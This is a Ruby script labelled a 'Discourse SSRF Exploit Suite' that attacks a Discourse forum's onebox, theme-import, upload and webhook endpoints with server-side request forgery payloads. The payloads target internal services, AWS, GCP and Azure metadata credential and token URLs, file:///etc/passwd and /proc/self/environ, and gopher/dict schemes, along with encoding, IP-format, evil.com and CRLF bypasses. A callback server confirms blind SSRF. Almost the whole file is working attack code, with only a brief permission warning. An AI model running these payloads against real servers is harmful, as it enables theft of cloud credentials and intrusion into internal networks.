#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'cgi'
require 'socket'
require 'timeout'
require 'webrick'
require 'thread'

class DiscourseSSRF
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    @callback_server = nil
    @callback_port = options[:callback_port] || 8888
    @callback_received = false
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\n🔍 Starting SSRF vulnerability tests on #{@target_url}"
    puts "=" * 60
    
    # Start callback server if needed
    start_callback_server if @callback_port
    
    # Basic SSRF tests
    test_basic_ssrf
    test_internal_network_access
    test_localhost_access
    test_metadata_access
    
    # Advanced bypass techniques
    test_encoding_bypasses
    test_ip_format_bypasses
    test_domain_bypasses
    test_protocol_bypasses
    test_path_traversal_bypasses
    test_crlf_injection
    
    # Blind SSRF tests
    test_time_based_ssrf
    test_callback_ssrf if @callback_server
    
    # DNS rebinding
    test_dns_rebinding
    
    # Cloud metadata
    test_cloud_metadata
    
    stop_callback_server if @callback_server
    
    print_results
    save_results
    
    @results
  end
  
  def test_basic_ssrf
    puts "\n[*] Testing basic SSRF vulnerabilities..."
    @results[:summary][:total_tests] += 1
    
    # Common SSRF endpoints in Discourse
    endpoints = [
      '/onebox',
      '/posts/oneboxes',
      '/admin/backups/upload',
      '/admin/themes/import',
      '/admin/plugins/install',
      '/uploads/lookup-metadata',
      '/webhooks/mailgun',
      '/webhooks/mandrill',
      '/webhooks/sendgrid',
      '/webhooks/sparkpost'
    ]
    
    # Internal targets
    targets = [
      'http://127.0.0.1:22',
      'http://localhost:3000',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://192.168.1.1',
      'http://10.0.0.1',
      'http://172.16.0.1'
    ]
    
    endpoints.each do |endpoint|
      targets.each do |target|
        test_ssrf_endpoint(endpoint, target, 'Basic SSRF')
      end
    end
  end
  
  def test_internal_network_access
    puts "\n[*] Testing internal network access..."
    @results[:summary][:total_tests] += 1
    
    # Common internal services
    internal_services = [
      'http://127.0.0.1:22',      # SSH
      'http://127.0.0.1:3306',    # MySQL
      'http://127.0.0.1:5432',    # PostgreSQL
      'http://127.0.0.1:6379',    # Redis
      'http://127.0.0.1:9200',    # Elasticsearch
      'http://127.0.0.1:8080',    # Common web port
      'http://127.0.0.1:8000',    # Development server
      'http://localhost:3000',    # Rails default
      'http://localhost:4200',    # Angular dev
      'http://localhost:8080'     # Tomcat/Jenkins
    ]
    
    internal_services.each do |service|
      test_ssrf_endpoint('/onebox', service, 'Internal Service Access')
    end
  end
  
  def test_localhost_access
    puts "\n[*] Testing localhost access variations..."
    @results[:summary][:total_tests] += 1
    
    localhost_variations = [
      'http://localhost/',
      'http://127.0.0.1/',
      'http://0.0.0.0/',
      'http://[::]/',
      'http://[::1]/',
      'http://127.1/',
      'http://127.0.1/',
      'http://0177.0.0.1/',  # Octal
      'http://2130706433/',   # Decimal
      'http://0x7f000001/'    # Hex
    ]
    
    localhost_variations.each do |target|
      test_ssrf_endpoint('/onebox', target, 'Localhost Access')
    end
  end
  
  def test_metadata_access
    puts "\n[*] Testing cloud metadata access..."
    @results[:summary][:total_tests] += 1
    
    metadata_urls = [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/instance-id',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://metadata.google.internal/computeMetadata/v1/instance/',
      'http://metadata.google.internal/computeMetadata/v1/project/',
      'http://100.100.100.200/latest/meta-data/',  # Alibaba Cloud
      'http://metadata.tencentyun.com/latest/meta-data/'  # Tencent Cloud
    ]
    
    metadata_urls.each do |url|
      test_ssrf_endpoint('/onebox', url, 'Cloud Metadata Access')
    end
  end
  
  def test_encoding_bypasses
    puts "\n[*] Testing encoding bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    base_url = 'http://127.0.0.1:22'
    
    encoded_urls = [
      CGI.escape(base_url),
      Base64.encode64(base_url).strip,
      'http://%31%32%37%2e%30%2e%30%2e%31:22',  # URL encoded
      'http://127.0.0.1%3a22',                  # Colon encoded
      'http://127.0.0.1%2322',                  # Hash encoded
      'http://127.0.0.1%0a:22',                 # Newline injection
      'http://127.0.0.1%0d:22',                 # Carriage return
      'http://127.0.0.1%09:22',                 # Tab injection
      'http://127.0.0.1%20:22'                  # Space injection
    ]
    
    encoded_urls.each do |url|
      test_ssrf_endpoint('/onebox', url, 'Encoding Bypass')
    end
  end
  
  def test_ip_format_bypasses
    puts "\n[*] Testing IP format bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    ip_formats = [
      'http://0177.0.0.1/',      # Octal
      'http://2130706433/',       # Decimal
      'http://0x7f000001/',       # Hex
      'http://0x7f.0x0.0x0.0x1/', # Mixed hex
      'http://127.1/',            # Short form
      'http://127.0.1/',          # Short form
      'http://127.000.000.001/',  # Zero padding
      'http://[::ffff:127.0.0.1]/', # IPv6 mapped
      'http://[::1]/',            # IPv6 localhost
      'http://[0:0:0:0:0:0:0:1]/' # IPv6 full
    ]
    
    ip_formats.each do |url|
      test_ssrf_endpoint('/onebox', url, 'IP Format Bypass')
    end
  end
  
  def test_domain_bypasses
    puts "\n[*] Testing domain bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    domain_bypasses = [
      'http://localtest.me/',
      'http://127.0.0.1.nip.io/',
      'http://127.0.0.1.xip.io/',
      'http://localhost.localdomain/',
      'http://127.0.0.1.127.0.0.1.nip.io/',
      'http://spoofed.burpcollaborator.net/',
      'http://127.0.0.1#.evil.com/',
      'http://evil.com#127.0.0.1/',
      'http://127.0.0.1@evil.com/',
      'http://evil.com@127.0.0.1/'
    ]
    
    domain_bypasses.each do |url|
      test_ssrf_endpoint('/onebox', url, 'Domain Bypass')
    end
  end
  
  def test_protocol_bypasses
    puts "\n[*] Testing protocol bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    protocol_bypasses = [
      'file:///etc/passwd',
      'file:///proc/version',
      'file:///proc/self/environ',
      'ftp://127.0.0.1/',
      'gopher://127.0.0.1:22/',
      'dict://127.0.0.1:11211/',
      'ldap://127.0.0.1/',
      'sftp://127.0.0.1/',
      'tftp://127.0.0.1/',
      'jar://http://127.0.0.1!/'
    ]
    
    protocol_bypasses.each do |url|
      test_ssrf_endpoint('/onebox', url, 'Protocol Bypass')
    end
  end
  
  def test_path_traversal_bypasses
    puts "\n[*] Testing path traversal bypass techniques..."
    @results[:summary][:total_tests] += 1
    
    traversal_payloads = [
      'http://evil.com/../127.0.0.1/',
      'http://evil.com/..\\127.0.0.1/',
      'http://evil.com/%2e%2e/127.0.0.1/',
      'http://evil.com/%2e%2e%2f127.0.0.1/',
      'http://evil.com/....//127.0.0.1/',
      'http://evil.com/..;/127.0.0.1/',
      'http://evil.com/..//127.0.0.1/',
      'http://evil.com/..%2f127.0.0.1/',
      'http://evil.com/..%5c127.0.0.1/'
    ]
    
    traversal_payloads.each do |url|
      test_ssrf_endpoint('/onebox', url, 'Path Traversal Bypass')
    end
  end
  
  def test_crlf_injection
    puts "\n[*] Testing CRLF injection techniques..."
    @results[:summary][:total_tests] += 1
    
    crlf_payloads = [
      "http://127.0.0.1%0d%0aHost:%20evil.com",
      "http://127.0.0.1%0aHost:%20evil.com",
      "http://127.0.0.1%0d%0aX-Forwarded-For:%20evil.com",
      "http://127.0.0.1%0d%0aSet-Cookie:%20admin=true",
      "http://127.0.0.1%0d%0a%0d%0aHTTP/1.1%20200%20OK",
      "http://127.0.0.1%0d%0aContent-Length:%200%0d%0a%0d%0a",
      "http://127.0.0.1%0d%0aLocation:%20http://evil.com"
    ]
    
    crlf_payloads.each do |url|
      test_ssrf_endpoint('/onebox', url, 'CRLF Injection')
    end
  end
  
  def test_time_based_ssrf
    puts "\n[*] Testing time-based blind SSRF..."
    @results[:summary][:total_tests] += 1
    
    # Test with slow responding services
    slow_targets = [
      'http://httpbin.org/delay/5',
      'http://127.0.0.1:1',  # Closed port - should timeout
      'http://10.0.0.1:80',  # Internal network
      'http://192.168.1.1:80'
    ]
    
    slow_targets.each do |target|
      start_time = Time.now
      response = test_ssrf_endpoint('/onebox', target, 'Time-based SSRF', false)
      end_time = Time.now
      
      response_time = end_time - start_time
      
      if response_time > 3  # Significant delay indicates SSRF
        add_vulnerability({
          test_type: 'Time-based SSRF',
          endpoint: '/onebox',
          payload: target,
          method: 'POST',
          severity: 'High',
          evidence: ["Response time: #{response_time.round(2)}s"],
          description: 'Time-based SSRF detected - server made request to internal target'
        })
      end
    end
  end
  
  def test_callback_ssrf
    puts "\n[*] Testing callback-based blind SSRF..."
    @results[:summary][:total_tests] += 1
    
    return unless @callback_server
    
    callback_url = "http://#{get_local_ip}:#{@callback_port}/ssrf-test"
    
    @callback_received = false
    
    # Test callback SSRF
    test_ssrf_endpoint('/onebox', callback_url, 'Callback SSRF', false)
    
    # Wait for callback
    sleep(3)
    
    if @callback_received
      add_vulnerability({
        test_type: 'Callback SSRF',
        endpoint: '/onebox',
        payload: callback_url,
        method: 'POST',
        severity: 'Critical',
        evidence: ['Callback received from target server'],
        description: 'SSRF confirmed via callback - server made external request'
      })
    end
  end
  
  def test_dns_rebinding
    puts "\n[*] Testing DNS rebinding attacks..."
    @results[:summary][:total_tests] += 1
    
    # DNS rebinding domains that resolve to localhost
    rebinding_domains = [
      'http://7f000001.1time.rebind.network/',
      'http://127.0.0.1.1time.rebind.network/',
      'http://rebind.network/',
      'http://localtest.me/',
      'http://127.0.0.1.nip.io/'
    ]
    
    rebinding_domains.each do |domain|
      test_ssrf_endpoint('/onebox', domain, 'DNS Rebinding')
    end
  end
  
  def test_cloud_metadata
    puts "\n[*] Testing cloud metadata endpoints..."
    @results[:summary][:total_tests] += 1
    
    # AWS metadata
    aws_endpoints = [
      'http://169.254.169.254/latest/meta-data/instance-id',
      'http://169.254.169.254/latest/meta-data/local-ipv4',
      'http://169.254.169.254/latest/meta-data/public-ipv4',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.169.254/latest/user-data'
    ]
    
    # Google Cloud metadata
    gcp_endpoints = [
      'http://metadata.google.internal/computeMetadata/v1/instance/name',
      'http://metadata.google.internal/computeMetadata/v1/instance/id',
      'http://metadata.google.internal/computeMetadata/v1/project/project-id',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
    ]
    
    # Azure metadata
    azure_endpoints = [
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
    ]
    
    (aws_endpoints + gcp_endpoints + azure_endpoints).each do |endpoint|
      test_ssrf_endpoint('/onebox', endpoint, 'Cloud Metadata')
    end
  end
  
  def test_ssrf_endpoint(endpoint, target_url, test_type, verbose = true)
    puts "  Testing #{endpoint} with #{target_url}" if verbose
    
    # Different payload formats for different endpoints
    payloads = case endpoint
    when '/onebox'
      [
        { url: target_url },
        { 'onebox[url]' => target_url },
        { 'url' => target_url, 'refresh' => 'true' }
      ]
    when '/posts/oneboxes'
      [
        { urls: [target_url] },
        { 'urls[]' => target_url }
      ]
    when '/admin/themes/import'
      [
        { remote: target_url },
        { 'theme[remote]' => target_url }
      ]
    when '/uploads/lookup-metadata'
      [
        { url: target_url }
      ]
    else
      [
        { url: target_url },
        { target: target_url },
        { endpoint: target_url }
      ]
    end
    
    payloads.each do |payload|
      response = make_post_request("#{@target_url}#{endpoint}", payload)
      
      if response && check_ssrf_success(response, target_url)
        add_vulnerability({
          test_type: test_type,
          endpoint: endpoint,
          payload: target_url,
          method: 'POST',
          severity: determine_severity(target_url, response),
          evidence: extract_ssrf_evidence(response, target_url),
          description: "SSRF vulnerability allows access to #{target_url}"
        })
        
        return response
      end
    end
    
    nil
  end
  
  def check_ssrf_success(response, target_url)
    return false unless response
    
    # Check for connection errors that indicate SSRF attempt
    connection_errors = [
      'Connection refused',
      'Connection timed out',
      'No route to host',
      'Network is unreachable',
      'Connection reset',
      'ECONNREFUSED',
      'ETIMEDOUT',
      'EHOSTUNREACH',
      'ENETUNREACH'
    ]
    
    # Check for internal service responses
    internal_indicators = [
      'SSH-2.0',           # SSH banner
      'HTTP/1.1 400',      # HTTP error from internal service
      'HTTP/1.1 404',      # HTTP not found from internal service
      'HTTP/1.1 500',      # Internal server error
      'MySQL',             # MySQL error
      'PostgreSQL',        # PostgreSQL error
      'Redis',             # Redis response
      'Elasticsearch',     # Elasticsearch response
      'instance-id',       # AWS metadata
      'computeMetadata',   # GCP metadata
      'metadata'           # General metadata
    ]
    
    response_text = response.body.to_s
    
    # Check for connection errors (indicates SSRF attempt)
    connection_errors.each do |error|
      return true if response_text.include?(error)
    end
    
    # Check for internal service indicators
    internal_indicators.each do |indicator|
      return true if response_text.include?(indicator)
    end
    
    # Check for successful metadata access
    if target_url.include?('169.254.169.254') || target_url.include?('metadata')
      return true if response.code.to_i == 200 && response_text.length > 10
    end
    
    # Check for localhost access
    if target_url.include?('127.0.0.1') || target_url.include?('localhost')
      return true if response.code.to_i == 200 || response.code.to_i == 404
    end
    
    false
  end
  
  def determine_severity(target_url, response)
    # Critical: Cloud metadata access
    if target_url.include?('169.254.169.254') || target_url.include?('metadata')
      return 'Critical'
    end
    
    # High: Internal network access
    if target_url.match(/127\.0\.0\.1|localhost|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\./) 
      return 'High'
    end
    
    # Medium: Other SSRF
    'Medium'
  end
  
  def extract_ssrf_evidence(response, target_url)
    evidence = []
    response_text = response.body.to_s
    
    # Extract specific evidence based on response
    if response_text.include?('Connection refused')
      evidence << 'Connection refused (port closed)'
    elsif response_text.include?('SSH-2.0')
      evidence << 'SSH service banner detected'
    elsif response_text.include?('instance-id')
      evidence << 'AWS metadata accessed'
    elsif response_text.include?('computeMetadata')
      evidence << 'GCP metadata accessed'
    elsif response.code.to_i == 200
      evidence << 'Successful HTTP response'
    end
    
    evidence << "Response code: #{response.code}"
    evidence << "Response length: #{response_text.length} bytes"
    
    evidence
  end
  
  def start_callback_server
    return if @callback_server
    
    puts "[*] Starting callback server on port #{@callback_port}..."
    
    @callback_server = Thread.new do
      begin
        server = WEBrick::HTTPServer.new(
          Port: @callback_port,
          Logger: WEBrick::Log.new('/dev/null'),
          AccessLog: []
        )
        
        server.mount_proc '/' do |req, res|
          @callback_received = true
          puts "[+] Callback received from #{req.peeraddr[2]}:#{req.peeraddr[1]}"
          res.body = 'SSRF Test Callback Received'
        end
        
        server.start
      rescue => e
        puts "[!] Callback server error: #{e.message}"
      end
    end
    
    sleep(1)  # Give server time to start
  end
  
  def stop_callback_server
    if @callback_server
      @callback_server.kill
      @callback_server = nil
      puts "[*] Callback server stopped"
    end
  end
  
  def get_local_ip
    # Get local IP for callback server
    Socket.ip_address_list.detect{|intf| intf.ipv4_private?}&.ip_address || '127.0.0.1'
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      # Don't print errors for expected connection failures in SSRF testing
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    end
    
    puts "  ✓ #{vuln_data[:severity]} SSRF found: #{vuln_data[:payload]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE SSRF TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Payload: #{vuln[:payload]}"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_ssrf_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse SSRF Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_ssrf.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('--callback-port PORT', Integer, 'Callback server port (default: 8888)') do |port|
      options[:callback_port] = port
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_ssrf.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseSSRF.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\n🚨 CRITICAL: SSRF vulnerabilities found!"
      puts "   Server-side request forgery and internal network access possible!"
    else
      puts "\n✅ No SSRF vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end